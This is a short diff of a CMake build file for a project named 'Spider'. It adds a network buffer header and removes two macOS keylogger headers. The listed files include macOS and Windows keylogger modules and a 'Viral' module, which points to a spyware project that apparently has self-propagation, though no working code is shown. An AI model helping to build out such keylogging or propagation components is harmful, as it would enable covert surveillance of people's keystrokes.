@@ -30,6 +30,7 @@ set(HEADERS_SPIDER_NETWORK
         Project/Network/SSLConnection.hpp
         Project/Network/ErrorCode.hpp
         Project/Network/TCPAcceptor.hpp
+        Project/Network/BufferView.hpp
         Project/Network/Timer.hpp)
 
 set(HEADERS_SPIDER_PROTOCOL
@@ -70,8 +71,7 @@ set(HEADERS_SPIDER
 if (APPLE)
     set(HEADERS_SPIDER ${HEADERS_SPIDER}
             Project/KeyLogger/details/OSXKeyLogger.hpp
-            Project/KeyLogger/details/OSXEventListener.hpp
-            Project/KeyLogger/details/OSXKeyMatchingTable.hpp)
+            )
     set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/Viral/details/OSXViral.hpp)
 elseif (WIN32)
     set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/KeyLogger/details/WinKeyLogger.hpp)
